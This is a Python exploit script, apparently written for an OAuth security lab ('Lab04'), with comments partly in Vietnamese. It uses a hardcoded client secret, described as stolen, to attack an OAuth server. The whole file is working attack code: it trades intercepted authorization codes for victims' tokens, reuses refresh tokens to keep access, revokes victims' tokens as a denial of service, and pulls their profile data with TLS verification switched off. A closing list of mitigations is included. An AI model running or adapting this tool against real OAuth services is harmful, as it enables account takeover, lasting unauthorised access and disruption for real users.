#!/usr/bin/env python3
"""
Client Secret Exploitation Tool for Lab04
Demonstrates various attack vectors when client secret is compromised
"""

import requests
import base64
import json
import time
import sys
from urllib.parse import parse_qs, urlparse

# Stolen client credentials từ lab04 callback page
CLIENT_ID = "f20e7e23-0376-4c18-9e05-1f862264a288"
CLIENT_SECRET = "8vM9ecVb7PC9PBpoj23uwfWty0yJdVVL"
TOKEN_URL = "https://server-04.oauth.labs/oauth/token"
REVOKE_URL = "https://server-04.oauth.labs/oauth/revoke"
REGISTER_URL = "https://server-04.oauth.labs/oauth/register"

class ClientSecretExploiter:
    def __init__(self):
        self.client_id = CLIENT_ID
        self.client_secret = CLIENT_SECRET
        self.credentials = f"{self.client_id}:{self.client_secret}"
        self.b64_credentials = base64.b64encode(self.credentials.encode()).decode()
        
    def get_auth_headers(self):
        """Get authorization headers với stolen client secret"""
        return {
            "Authorization": f"Basic {self.b64_credentials}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    
    def exchange_authorization_code(self, code, redirect_uri="https://client-04.oauth.labs/callback"):
        """
        Attack Vector 1: Exchange stolen authorization code
        Tác động: Steal user's access tokens
        """
        print(f"[+] Attempting to exchange authorization code: {code[:20]}...")
        
        headers = self.get_auth_headers()
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": redirect_uri
        }
        
        try:
            response = requests.post(TOKEN_URL, headers=headers, data=data, verify=False, timeout=10)
            
            if response.status_code == 200:
                tokens = response.json()
                print(f"[SUCCESS] Authorization code exchange successful!")
                print(f"[SUCCESS] Access Token: {tokens.get('access_token', '')[:50]}...")
                print(f"[SUCCESS] Refresh Token: {tokens.get('refresh_token', '')[:50]}...")
                print(f"[SUCCESS] Token Type: {tokens.get('token_type', 'N/A')}")
                print(f"[SUCCESS] Expires In: {tokens.get('expires_in', 'N/A')} seconds")
                return tokens
            else:
                print(f"[FAILED] Exchange failed: {response.status_code}")
                print(f"[ERROR] Response: {response.text}")
                return None
                
        except Exception as e:
            print(f"[ERROR] Exception during code exchange: {e}")
            return None
    
    def refresh_token_attack(self, refresh_token):
        """
        Attack Vector 2: Abuse refresh token để maintain persistent access
        Tác động: Long-term account compromise
        """
        print(f"[+] Attempting refresh token attack: {refresh_token[:20]}...")
        
        headers = self.get_auth_headers()
        data = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token
        }
        
        try:
            response = requests.post(TOKEN_URL, headers=headers, data=data, verify=False, timeout=10)
            
            if response.status_code == 200:
                tokens = response.json()
                print(f"[SUCCESS] Refresh token attack successful!")
                print(f"[SUCCESS] New Access Token: {tokens.get('access_token', '')[:50]}...")
                if tokens.get('refresh_token'):
                    print(f"[SUCCESS] New Refresh Token: {tokens.get('refresh_token', '')[:50]}...")
                return tokens
            else:
                print(f"[FAILED] Refresh failed: {response.status_code}")
                print(f"[ERROR] Response: {response.text}")
                return None
                
        except Exception as e:
            print(f"[ERROR] Exception during refresh: {e}")
            return None
    
    def revoke_token_dos(self, token):
        """
        Attack Vector 3: Token revocation DoS attack
        Tác động: Force user logout, service disruption
        """
        print(f"[+] Attempting token revocation DoS: {token[:20]}...")
        
        headers = self.get_auth_headers()
        data = {"token": token}
        
        try:
            response = requests.post(REVOKE_URL, headers=headers, data=data, verify=False, timeout=10)
            
            if response.status_code == 200:
                print(f"[SUCCESS] Token revocation successful!")
                print(f"[SUCCESS] Victim's token has been revoked: {token[:30]}...")
                print(f"[IMPACT] User will be forced to re-authenticate")
                return True
            else:
                print(f"[FAILED] Revocation failed: {response.status_code}")
                print(f"[ERROR] Response: {response.text}")
                return False
                
        except Exception as e:
            print(f"[ERROR] Exception during revocation: {e}")
            return False
    
    def test_profile_access(self, access_token):
        """Test access to protected resource với stolen token"""
        print(f"[+] Testing profile access với stolen token...")
        
        headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json"
        }
        
        try:
            response = requests.get(
                "https://server-04.oauth.labs/api/users/me",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                profile = response.json()
                print(f"[SUCCESS] Profile access successful!")
                print(f"[DATA] Name: {profile.get('firstname', 'N/A')} {profile.get('lastname', 'N/A')}")
                print(f"[DATA] Email: {profile.get('email', 'N/A')}")
                if profile.get('extra'):
                    print(f"[DATA] Extra: {profile.get('extra')}")
                return profile
            else:
                print(f"[FAILED] Profile access failed: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"[ERROR] Exception during profile access: {e}")
            return None
    
    def extract_code_from_callback_url(self, callback_url):
        """Extract authorization code từ callback URL"""
        try:
            parsed = urlparse(callback_url)
            params = parse_qs(parsed.query)
            code = params.get('code', [None])[0]
            state = params.get('state', [None])[0]
            
            if code:
                print(f"[+] Extracted authorization code: {code}")
                print(f"[+] State parameter: {state}")
                return code, state
            else:
                print(f"[-] No authorization code found in URL")
                return None, None
                
        except Exception as e:
            print(f"[ERROR] Failed to parse callback URL: {e}")
            return None, None
    
    def simulate_authorization_code_steal(self):
        """Simulate stealing authorization code từ victim's browser"""
        print(f"\n[SCENARIO] Authorization Code Theft Attack")
        print(f"=" * 50)
        print(f"1. Attacker monitors victim's browser traffic")
        print(f"2. Victim completes OAuth authorization")
        print(f"3. Attacker intercepts callback URL with authorization code")
        print(f"4. Attacker uses stolen client secret to exchange code")
        
        # Simulate intercepted callback URL
        example_callback = "https://client-04.oauth.labs/callback?code=INTERCEPTED_AUTH_CODE&state=abc123"
        print(f"\n[+] Intercepted callback URL: {example_callback}")
        
        code, state = self.extract_code_from_callback_url(example_callback)
        if code:
            print(f"[+] Proceeding with code exchange using stolen client secret...")
            # Note: This will fail vì code không real, nhưng demonstrates attack vector
            self.exchange_authorization_code(code)
    
    def demonstrate_attacks(self):
        """Demonstrate all attack vectors"""
        print("=" * 60)
        print("CLIENT SECRET EXPLOITATION DEMONSTRATION")
        print("=" * 60)
        print(f"Compromised Client ID: {self.client_id}")
        print(f"Compromised Client Secret: {self.client_secret[:20]}...")
        print(f"Base64 Credentials: {self.b64_credentials[:50]}...")
        print("=" * 60)
        
        # Attack Vector 1: Authorization Code Theft
        self.simulate_authorization_code_steal()
        
        print(f"\n[SCENARIO] Refresh Token Persistence Attack")
        print(f"=" * 50)
        print(f"Note: Requires a valid refresh token from previous compromise")
        print(f"Impact: Maintains long-term access even after user logout")
        
        print(f"\n[SCENARIO] Token Revocation DoS Attack")
        print(f"=" * 50)
        print(f"Note: Requires victim's access/refresh token")
        print(f"Impact: Forces victim logout and service disruption")
        
        print(f"\n[SECURITY IMPLICATIONS]")
        print(f"=" * 50)
        print(f"✓ Complete OAuth flow compromise")
        print(f"✓ User impersonation capabilities")
        print(f"✓ Persistent access maintenance")
        print(f"✓ Denial of service attacks")
        print(f"✓ Session hijacking potential")
        
        print(f"\n[MITIGATION REQUIRED]")
        print(f"=" * 50)
        print(f"1. Rotate client secret immediately")
        print(f"2. Move token exchange to server-side")
        print(f"3. Implement client certificate pinning")
        print(f"4. Add rate limiting on OAuth endpoints")
        print(f"5. Monitor for suspicious client usage")

def main():
    """Main execution function"""
    exploiter = ClientSecretExploiter()
    
    if len(sys.argv) > 1:
        command = sys.argv[1].lower()
        
        if command == "code" and len(sys.argv) > 2:
            # Exchange specific authorization code
            code = sys.argv[2]
            exploiter.exchange_authorization_code(code)
            
        elif command == "refresh" and len(sys.argv) > 2:
            # Abuse specific refresh token
            refresh_token = sys.argv[2]
            exploiter.refresh_token_attack(refresh_token)
            
        elif command == "revoke" and len(sys.argv) > 2:
            # Revoke specific token
            token = sys.argv[2]
            exploiter.revoke_token_dos(token)
            
        elif command == "profile" and len(sys.argv) > 2:
            # Test profile access với stolen token
            access_token = sys.argv[2]
            exploiter.test_profile_access(access_token)
            
        else:
            print("Usage:")
            print("  python client_secret_exploitation.py code <AUTH_CODE>")
            print("  python client_secret_exploitation.py refresh <REFRESH_TOKEN>")
            print("  python client_secret_exploitation.py revoke <TOKEN>")
            print("  python client_secret_exploitation.py profile <ACCESS_TOKEN>")
            print("  python client_secret_exploitation.py demo")
    else:
        # Run full demonstration
        exploiter.demonstrate_attacks()

if __name__ == "__main__":
    main() 